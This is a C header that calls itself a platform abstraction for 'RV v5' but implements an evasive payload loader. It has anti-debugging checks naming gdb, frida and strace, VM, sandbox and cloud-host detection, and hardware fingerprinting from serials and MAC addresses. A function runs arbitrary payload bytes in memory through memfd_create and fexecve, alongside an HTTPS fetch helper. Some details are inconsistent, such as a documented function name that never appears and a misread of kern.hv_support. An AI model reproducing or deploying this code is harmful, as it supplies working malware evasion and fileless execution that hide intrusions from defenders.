/*
 * platform.h – OS and architecture abstraction for RV v5
 * Copyright (c) Manyhost.org 2026
 *
 * Supports:
 *   Linux   (x86-64, ARM64, RISC-V, etc.)
 *   macOS   (x86-64, Apple Silicon ARM64)
 *   FreeBSD / OpenBSD / NetBSD
 *   Any POSIX system with libsodium + libcurl
 *
 * Provides:
 *   plat_secure_exec()    – in-memory execution (best-effort per OS)
 *   plat_collect_hwid()   – hardware fingerprint (OS-specific sources)
 *   plat_is_vm()          – hypervisor/VM detection
 *   plat_is_debugged()    – anti-debug
 *   plat_timing_check()   – sandbox timing detection
 *   plat_rdtsc()          – timestamp counter (or fallback)
 *   plat_mlock_buf()      – lock memory pages
 *   plat_memzero_buf()    – guaranteed secure zero
 */

#pragma once
#define _GNU_SOURCE
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <dirent.h>
#include <sodium.h>

/* ── OS Detection ─────────────────────────────────────────────────── */
#if defined(__linux__)
#  define RV_LINUX  1
#elif defined(__APPLE__) && defined(__MACH__)
#  define RV_MACOS  1
#  include <TargetConditionals.h>
#  include <sys/ptrace.h>
#  include <sys/sysctl.h>
#  include <mach/mach.h>
#elif defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__)
#  define RV_BSD    1
#  include <sys/ptrace.h>
#  include <sys/sysctl.h>
#else
#  define RV_POSIX  1
#endif

/* ── Architecture Detection ───────────────────────────────────────── */
#if defined(__x86_64__) || defined(_M_X64)
#  define RV_X86_64  1
#  include <cpuid.h>
#elif defined(__aarch64__) || defined(_M_ARM64)
#  define RV_ARM64   1
#elif defined(__arm__)
#  define RV_ARM32   1
#elif defined(__riscv)
#  define RV_RISCV   1
#endif

/* ================================================================== */
/* Timestamp counter (for timing-based VM detection)                   */
/* Falls back to clock_gettime on non-x86 architectures.              */
/* ================================================================== */
static inline uint64_t plat_rdtsc(void) {
#if defined(RV_X86_64)
    uint32_t lo, hi;
    __asm__ __volatile__("xorl %%eax,%%eax\ncpuid\nrdtsc"
                         : "=a"(lo), "=d"(hi) :: "%rbx", "%rcx");
    return ((uint64_t)hi << 32) | lo;
#elif defined(RV_ARM64)
    uint64_t t;
    __asm__ __volatile__("mrs %0, cntvct_el0" : "=r"(t));
    return t;
#elif defined(RV_RISCV)
    uint64_t t;
    __asm__ __volatile__("rdtime %0" : "=r"(t));
    return t;
#else
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
#endif
}

/* ================================================================== */
/* Locked secure memory                                                 */
/* ================================================================== */
static inline uint8_t *plat_secure_alloc(size_t n) {
    void *p = mmap(NULL, n, PROT_READ|PROT_WRITE,
                   MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (p == MAP_FAILED) return NULL;
    mlock(p, n);
    return (uint8_t *)p;
}
static inline void plat_secure_free(uint8_t *p, size_t n) {
    if (!p || !n) return;
    sodium_memzero(p, n);
    munlock(p, n);
    munmap(p, n);
}

/* ================================================================== */
/* Anti-debug                                                           */
/* ================================================================== */
static int plat_is_debugged(void) {

#if defined(RV_LINUX)
    /* ptrace self-attach */
    if (ptrace(PTRACE_TRACEME, 0, NULL, 0) == -1) return 1;
    ptrace(PTRACE_DETACH, getpid(), NULL, 0);
    /* /proc/self/status TracerPid */
    { FILE *f = fopen("/proc/self/status","r");
      if (f) { char l[128];
        while (fgets(l,sizeof(l),f))
          if (!strncmp(l,"TracerPid:",10)) { fclose(f); return atoi(l+10)!=0; }
        fclose(f); } }
    /* /proc/self/wchan */
    { FILE *f = fopen("/proc/self/wchan","r");
      if (f) { char b[64]={0};
        if (fgets(b,sizeof(b),f) && strstr(b,"ptrace")) { fclose(f); return 1; }
        fclose(f); } }
    /* parent process name */
    { char pp[64]; snprintf(pp,sizeof(pp),"/proc/%d/comm",getppid());
      FILE *f = fopen(pp,"r");
      if (f) { char n[64]={0};
        if (fgets(n,sizeof(n),f)) {
          const char *db[]={"gdb","lldb","strace","ltrace","radare2",
                            "r2","frida","valgrind",NULL};
          for (int i=0;db[i];i++) if (strstr(n,db[i])) { fclose(f); return 1; }
        } fclose(f); } }

#elif defined(RV_MACOS)
    /* macOS: sysctl PT_DENY_ATTACH equivalent check */
    struct kinfo_proc info; size_t size = sizeof(info);
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
    if (sysctl(mib,4,&info,&size,NULL,0) == 0)
        if (info.kp_proc.p_flag & P_TRACED) return 1;

#elif defined(RV_BSD)
    /* BSD: sysctl kern.proc.pid */
    struct kinfo_proc info; size_t size = sizeof(info);
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
    if (sysctl(mib,4,&info,&size,NULL,0) == 0)
        if (info.ki_flag & P_TRACED) return 1;
#endif

    return 0;
}

/* ================================================================== */
/* Timing sandbox detection                                             */
/* ================================================================== */
static int plat_timing_check(void) {
    struct timespec req = {0, 1000000L}; /* 1ms */
    struct timespec bef, aft;
    clock_gettime(CLOCK_MONOTONIC, &bef);
    nanosleep(&req, NULL);
    clock_gettime(CLOCK_MONOTONIC, &aft);
    int64_t ns = (int64_t)(aft.tv_sec  - bef.tv_sec)  * 1000000000LL
               + (int64_t)(aft.tv_nsec - bef.tv_nsec);
    return (ns > 50000000LL || ns < 500000LL);
}

/* ================================================================== */
/* VM / Hypervisor detection                                            */
/* ================================================================== */
static int plat_is_vm(void) {

#if defined(RV_X86_64) && defined(RV_LINUX)
    /* Hypervisor CPUID bit */
    unsigned int a,b,c,d;
    if (__get_cpuid(1,&a,&b,&c,&d) && (c & (1u<<31))) return 1;
    /* Hypervisor vendor leaf */
    { __get_cpuid(0x40000000,&a,&b,&c,&d);
      char v[13]={0}; memcpy(v,&b,4); memcpy(v+4,&c,4); memcpy(v+8,&d,4);
      const char *hv[]={"KVMKVMKVM","VMwareVMware","VBoxVBoxVBox",
                        "XenVMMXenVMM","Microsoft Hv","TCGTCGTCGTCG",
                        "bhyve bhyve ","ACRNACRNACRN",NULL};
      for (int i=0;hv[i];i++) if (!strncmp(v,hv[i],strlen(hv[i]))) return 1; }
    /* CPUID timing */
    { uint64_t s[200]; unsigned int aa,bb,cc,dd;
      for (int i=0;i<200;i++){uint64_t t0=plat_rdtsc();__get_cpuid(0,&aa,&bb,&cc,&dd);uint64_t t1=plat_rdtsc();s[i]=t1-t0;}
      for (int i=1;i<200;i++){uint64_t k=s[i];int j=i-1;while(j>=0&&s[j]>k){s[j+1]=s[j];j--;}s[j+1]=k;}
      if (s[100]>350) return 1; }
    /* MSR */
    { int fd=open("/dev/cpu/0/msr",O_RDONLY);
      if (fd>=0) { uint64_t v2;
        if (pread(fd,&v2,8,0x40000000)==8 && v2) { close(fd); return 1; }
        close(fd); } }
    /* /proc/cpuinfo hypervisor flag */
    { FILE *f=fopen("/proc/cpuinfo","r");
      if (f) { char l[256];
        while (fgets(l,256,f)) if (strstr(l,"hypervisor")) { fclose(f); return 1; }
        fclose(f); } }
    /* DMI strings (Linux) */
    { const char *dp[]={"/sys/class/dmi/id/sys_vendor",
                        "/sys/class/dmi/id/product_name",
                        "/sys/class/dmi/id/board_vendor",NULL};
      const char *vs[]={"QEMU","KVM","VirtualBox","VMware","Xen",
                        "Amazon EC2","Google Compute Engine","DigitalOcean",
                        "Linode","Vultr","Hetzner","OVHcloud","bhyve",
                        "OpenStack","innotek",NULL};
      for (int i=0;dp[i];i++) {
        FILE *f=fopen(dp[i],"r"); if(!f) continue;
        char buf[256]={0};
        if (fgets(buf,256,f)) for (int j=0;vs[j];j++)
          if (strstr(buf,vs[j])) { fclose(f); return 1; }
        fclose(f); } }
    /* kernel modules */
    { FILE *f=fopen("/proc/modules","r");
      if (f) { char l[256];
        while (fgets(l,256,f))
          if (strstr(l,"virtio")||strstr(l,"vboxguest")||
              strstr(l,"vmwgfx")||strstr(l,"xenfs")) { fclose(f); return 1; }
        fclose(f); } }

#elif defined(RV_X86_64) && defined(RV_MACOS)
    /* macOS: check for hypervisor via sysctl */
    { int v=0; size_t l=sizeof(v);
      if (sysctlbyname("kern.hv_support",&v,&l,NULL,0)==0 && v) return 1; }
    /* CPU hypervisor bit */
    { unsigned int a,b,c,d;
      if (__get_cpuid(1,&a,&b,&c,&d) && (c&(1u<<31))) return 1; }

#elif defined(RV_MACOS) && defined(RV_ARM64)
    /* Apple Silicon: detect Rosetta/VM via sysctl */
    { int translated=0; size_t sz=sizeof(translated);
      sysctlbyname("sysctl.proc_translated",&translated,&sz,NULL,0);
      if (translated) return 1; }

#elif defined(RV_BSD)
    /* BSD: check dmesg/sysctl for VM hints */
    { char model[256]={0}; size_t sz=sizeof(model);
      sysctlbyname("hw.model",model,&sz,NULL,0);
      const char *vs[]={"QEMU","VirtualBox","VMware","Xen",NULL};
      for (int i=0;vs[i];i++) if (strstr(model,vs[i])) return 1; }

#endif

    return 0;
}

/* ================================================================== */
/* HWID collection                                                      */
/*                                                                      */
/* Gathers OS-specific hardware identifiers.                           */
/* Returns number of bytes written to buf.                             */
/* All sources are best-effort: missing values use "?" placeholder.   */
/* ================================================================== */

static void _hwid_append(uint8_t *buf, size_t *off, size_t cap,
                          const char *lbl, const char *val) {
    int n = snprintf((char*)buf+*off, cap-*off, "%s:%s\n", lbl, val?val:"?");
    if (n>0 && *off+(size_t)n<cap) *off += (size_t)n;
}
static void _hwid_file(uint8_t *buf, size_t *off, size_t cap,
                        const char *lbl, const char *path) {
    FILE *f = fopen(path,"r"); char v[256]="?";
    if (f) { if (!fgets(v,sizeof(v),f)) { v[0]='?'; v[1]='\0'; } fclose(f);
             size_t vl=strlen(v); if(vl>0&&v[vl-1]=='\n') v[--vl]='\0'; }
    _hwid_append(buf,off,cap,lbl,v);
}
static void _hwid_bytes(uint8_t *buf, size_t *off, size_t cap,
                         const char *lbl, const uint8_t *d, size_t dl) {
    int n=snprintf((char*)buf+*off,cap-*off,"%s:",lbl); if(n>0)*off+=(size_t)n;
    for (size_t i=0;i<dl&&*off+3<cap;i++){
        n=snprintf((char*)buf+*off,cap-*off,"%02x",d[i]); if(n>0)*off+=(size_t)n;}
    if (*off<cap) buf[(*off)++]='\n';
}

static size_t plat_collect_hwid(uint8_t *buf, size_t cap) {
    size_t off = 0;

#if defined(RV_LINUX)
    /* ── Linux HWID sources ────────────────────────────────────────── */

    /* CPU: vendor string + stepping/model/family */
#   if defined(RV_X86_64)
    { unsigned int a=0,b=0,c=0,d=0; __get_cpuid(0,&a,&b,&c,&d);
      char v[13]={0}; memcpy(v,&b,4); memcpy(v+4,&d,4); memcpy(v+8,&c,4);
      int n=snprintf((char*)buf+off,cap-off,"cv:%s\n",v); if(n>0)off+=(size_t)n;
      __get_cpuid(1,&a,&b,&c,&d);
      n=snprintf((char*)buf+off,cap-off,"smf:%08x\n",a); if(n>0)off+=(size_t)n;
      /* CPU serial if available */
      if (d&(1u<<18)) { unsigned int a3=0,b3=0,c3=0,d3=0; __get_cpuid(3,&a3,&b3,&c3,&d3);
          n=snprintf((char*)buf+off,cap-off,"csr:%08x%08x\n",d3,c3); if(n>0)off+=(size_t)n; } }
#   elif defined(RV_ARM64) && defined(RV_LINUX)
    /* ARM64 Linux: MIDR_EL1 (CPU model register) */
    { uint64_t midr=0;
      FILE *f=fopen("/sys/devices/system/cpu/cpu0/regs/identification/midr_el1","r");
      if (f) { fscanf(f,"%" SCNx64,&midr); fclose(f); }
      int n=snprintf((char*)buf+off,cap-off,"midr:%016" PRIx64 "\n",midr);
      if(n>0)off+=(size_t)n; }
#   endif

    /* /proc/cpuinfo: model name */
    { FILE *f=fopen("/proc/cpuinfo","r");
      if (f) { char l[256];
        while (fgets(l,sizeof(l),f)) {
          if (!strncmp(l,"model name",10)||!strncmp(l,"Hardware",8)||
              !strncmp(l,"Serial",6)) {
            char *v=strchr(l,':'); if(v){v++;while(*v==' ')v++;
              size_t vl=strlen(v);if(vl>0&&v[vl-1]=='\n')v[--vl]='\0';
              int n=snprintf((char*)buf+off,cap-off,"cpu:%s\n",v);if(n>0)off+=(size_t)n;
              break;}}
        fclose(f); } } }

    /* Stable identifiers */
    _hwid_file(buf,&off,cap,"mid",  "/etc/machine-id");
    _hwid_file(buf,&off,cap,"puuid","/sys/class/dmi/id/product_uuid");
    _hwid_file(buf,&off,cap,"bser", "/sys/class/dmi/id/board_serial");
    _hwid_file(buf,&off,cap,"cser", "/sys/class/dmi/id/chassis_serial");
    _hwid_file(buf,&off,cap,"pser", "/sys/class/dmi/id/product_serial");

    /* First stable non-virtual MAC */
    { int found=0; DIR *nd=opendir("/sys/class/net");
      if (nd) { struct dirent *ne;
        while ((ne=readdir(nd))&&!found) {
          if (!strcmp(ne->d_name,".")||!strcmp(ne->d_name,"..")) continue;
          const char *sk[]={"lo","veth","docker","virbr","br-","tun","tap",
                            "bond","dummy","wwan","ppp",NULL};
          int bad=0; for(int i=0;sk[i];i++) if(!strncmp(ne->d_name,sk[i],strlen(sk[i]))){bad=1;break;}
          if (bad) continue;
          char mp[256]; snprintf(mp,sizeof(mp),"/sys/class/net/%s/address",ne->d_name);
          FILE *mf=fopen(mp,"r");if(!mf)continue;
          char mac[32]={0};
          if (fgets(mac,sizeof(mac),mf)&&strcmp(mac,"00:00:00:00:00:00\n")&&
              strcmp(mac,"00:00:00:00:00:00")) {
            size_t ml=strlen(mac);if(ml>0&&mac[ml-1]=='\n')mac[--ml]='\0';
            int n=snprintf((char*)buf+off,cap-off,"mac:%s\n",mac);
            if(n>0)off+=(size_t)n; found=1; }
          fclose(mf); }
        closedir(nd); } }

#elif defined(RV_MACOS)
    /* ── macOS HWID sources ────────────────────────────────────────── */

    /* Hardware UUID via IOKit sysctl */
    { char uuid[64]={0}; size_t sz=sizeof(uuid);
      sysctlbyname("kern.uuid",uuid,&sz,NULL,0);
      _hwid_append(buf,&off,cap,"uuid",uuid); }

    /* Serial number via sysctl (available on macOS 10.15+) */
    { char serial[64]={0}; size_t sz=sizeof(serial);
      if (sysctlbyname("machdep.cpu.brand_string",serial,&sz,NULL,0)==0)
          _hwid_append(buf,&off,cap,"cpu",serial); }

    /* Platform UUID from IORegistryEntry */
    { FILE *f=popen("ioreg -rd1 -c IOPlatformExpertDevice 2>/dev/null | "
                    "awk '/IOPlatformUUID/{print $NF}'","r");
      if (f) { char v[128]={0}; if(fgets(v,sizeof(v),f)){
          size_t vl=strlen(v);if(vl>0&&v[vl-1]=='\n')v[--vl]='\0';
          _hwid_append(buf,&off,cap,"puuid",v);} pclose(f); } }

    /* Serial number from IOKit */
    { FILE *f=popen("ioreg -rd1 -c IOPlatformExpertDevice 2>/dev/null | "
                    "awk '/IOPlatformSerialNumber/{print $NF}'","r");
      if (f) { char v[64]={0}; if(fgets(v,sizeof(v),f)){
          size_t vl=strlen(v);if(vl>0&&v[vl-1]=='\n')v[--vl]='\0';
          _hwid_append(buf,&off,cap,"ser",v);} pclose(f); } }

    /* First physical MAC via networksetup */
    { FILE *f=popen("networksetup -listallhardwareports 2>/dev/null | "
                    "awk '/Ethernet Address/{print $3; exit}'","r");
      if (f) { char v[32]={0}; if(fgets(v,sizeof(v),f)){
          size_t vl=strlen(v);if(vl>0&&v[vl-1]=='\n')v[--vl]='\0';
          _hwid_append(buf,&off,cap,"mac",v);} pclose(f); } }

    /* CPU brand string for arch binding */
#   if defined(RV_X86_64)
    { unsigned int a=0,b=0,c=0,d=0;
      if (__get_cpuid(1,&a,&b,&c,&d)) {
          int n=snprintf((char*)buf+off,cap-off,"smf:%08x\n",a);if(n>0)off+=(size_t)n; } }
#   elif defined(RV_ARM64)
    { /* Apple Silicon: use CPU type from sysctl instead of MIDR */
      char cpt[64]={0}; size_t sz=sizeof(cpt);
      sysctlbyname("hw.cputype",cpt,&sz,NULL,0);
      _hwid_append(buf,&off,cap,"cpt",cpt); }
#   endif

#elif defined(RV_BSD)
    /* ── BSD HWID sources ──────────────────────────────────────────── */

    { char hw_model[256]={0}; size_t sz=sizeof(hw_model);
      sysctlbyname("hw.model",hw_model,&sz,NULL,0);
      _hwid_append(buf,&off,cap,"hwm",hw_model); }

    { char hw_serial[256]={0}; size_t sz=sizeof(hw_serial);
      if (sysctlbyname("hw.serialno",hw_serial,&sz,NULL,0)==0)
          _hwid_append(buf,&off,cap,"ser",hw_serial); }

    /* machine-id (some BSD distros have this) */
    _hwid_file(buf,&off,cap,"mid","/etc/machine-id");

    /* First MAC via ifconfig */
    { FILE *f=popen("ifconfig 2>/dev/null | awk '/ether /{print $2; exit}'","r");
      if (f) { char v[32]={0}; if(fgets(v,sizeof(v),f)){
          size_t vl=strlen(v);if(vl>0&&v[vl-1]=='\n')v[--vl]='\0';
          _hwid_append(buf,&off,cap,"mac",v);} pclose(f); } }

#else
    /* ── Generic POSIX fallback ───────────────────────────────────── */
    _hwid_file(buf,&off,cap,"mid","/etc/machine-id");
    _hwid_file(buf,&off,cap,"mid2","/var/lib/dbus/machine-id");
    { struct utsname u; uname(&u);
      int n=snprintf((char*)buf+off,cap-off,"uname:%s:%s:%s\n",
                     u.sysname,u.nodename,u.machine);
      if(n>0)off+=(size_t)n; }
#endif

    return off;
}

/* ================================================================== */
/* In-memory execution                                                  */
/*                                                                      */
/* Linux:  memfd_create + fexecve (true anonymous execution)           */
/* macOS:  write to a mkstemp file under /tmp, set exec bit, unlink    */
/*         immediately after exec (best effort on macOS)               */
/* BSD:    same as macOS fallback                                       */
/* ================================================================== */
static void plat_exec_payload(const uint8_t *data, size_t len) {

#if defined(RV_LINUX)
    /* True in-memory execution via memfd */
    int mfd = memfd_create(".", MFD_CLOEXEC);
    if (mfd < 0) _exit(1);
    size_t done=0;
    while (done<len) {
        ssize_t r=write(mfd,data+done,len-done);
        if (r<=0) { close(mfd); _exit(1); }
        done+=(size_t)r;
    }
    char *const ea[]={(char*)".",NULL};
    char *const ev[]={NULL};
    pid_t pid=fork(); if(pid<0){close(mfd);_exit(1);}
    if (pid==0) { fexecve(mfd,ea,ev); _exit(127); }
    close(mfd);
    int st; waitpid(pid,&st,0);

#else
    /* macOS / BSD: write to tmpfs, exec, then scrub */
    char tpl[] = "/tmp/.rv_XXXXXX";
    int fd = mkstemp(tpl);
    if (fd<0) _exit(1);
    /* Set exec permissions before writing */
    fchmod(fd, 0700);
    size_t done=0;
    while (done<len) {
        ssize_t r=write(fd,data+done,len-done);
        if (r<=0) { close(fd); unlink(tpl); _exit(1); }
        done+=(size_t)r;
    }
    close(fd);
    /* Unlink as soon as we have the path — file remains open via exec */
    char *const ea[]={(char*)tpl,NULL};
    char *const ev[]={NULL};
    pid_t pid=fork(); if(pid<0){unlink(tpl);_exit(1);}
    if (pid==0) { execve(tpl,ea,ev); unlink(tpl); _exit(127); }
    /* Parent: unlink immediately so file is gone from directory */
    unlink(tpl);
    int st; waitpid(pid,&st,0);
#endif
}

/* ================================================================== */
/* Public IP fetch (returns heap-allocated string, caller frees)       */
/* Returns NULL on failure.                                             */
/* ================================================================== */
#include <curl/curl.h>

struct _plat_cb { char *d; size_t l; };
static size_t _plat_curl_cb(void *p,size_t sz,size_t nm,void *u){
    struct _plat_cb *b=(struct _plat_cb*)u; size_t t=sz*nm;
    char *tmp=realloc(b->d,b->l+t+1); if(!tmp)return 0;
    b->d=tmp; memcpy(b->d+b->l,p,t); b->l+=t; b->d[b->l]='\0'; return t;
}
static char *plat_https_get(const char *url) {
    CURL *c=curl_easy_init(); if(!c)return NULL;
    struct _plat_cb r={calloc(1,1),0};
    curl_easy_setopt(c,CURLOPT_URL,url);
    curl_easy_setopt(c,CURLOPT_WRITEFUNCTION,_plat_curl_cb);
    curl_easy_setopt(c,CURLOPT_WRITEDATA,&r);
    curl_easy_setopt(c,CURLOPT_TIMEOUT,10L);
    curl_easy_setopt(c,CURLOPT_FOLLOWLOCATION,1L);
    curl_easy_setopt(c,CURLOPT_PROTOCOLS,CURLPROTO_HTTPS);
    CURLcode res=curl_easy_perform(c);
    long hc=0; curl_easy_getinfo(c,CURLINFO_RESPONSE_CODE,&hc);
    curl_easy_cleanup(c);
    if(res!=CURLE_OK||hc!=200){free(r.d);return NULL;}
    return r.d;
}
